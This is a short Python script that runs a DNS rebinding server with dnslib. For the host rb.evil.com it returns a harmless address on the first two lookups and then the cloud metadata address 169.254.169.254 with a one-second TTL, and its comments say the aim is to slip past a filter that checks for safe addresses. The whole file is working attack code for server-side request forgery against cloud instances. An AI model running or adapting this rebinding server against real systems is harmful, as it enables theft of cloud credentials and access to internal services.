# rebinder.py
from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import time

class RebindResolver(BaseResolver):
    def __init__(self):
        self.counter = 0

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip('.')
        reply = request.reply()
        if qname == "rb.evil.com":
            self.counter += 1
            if self.counter <= 2:
                # Phase 1: return benign IP so filter sees safe address
                ip = "1.2.3.4"
            else:
                # Phase 2: return internal IP
                ip = "169.254.169.254"
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=1))
            print(f"[DNS] {qname} -> {ip} (counter={self.counter})")
        return reply

if __name__ == "__main__":
    PORT = 5353
    ADDRESS = "127.0.0.1"
    resolver = RebindResolver()
    server = DNSServer(resolver, port=PORT, address=ADDRESS)
    server.start()
    print(f"Server started at {ADDRESS}:{PORT}")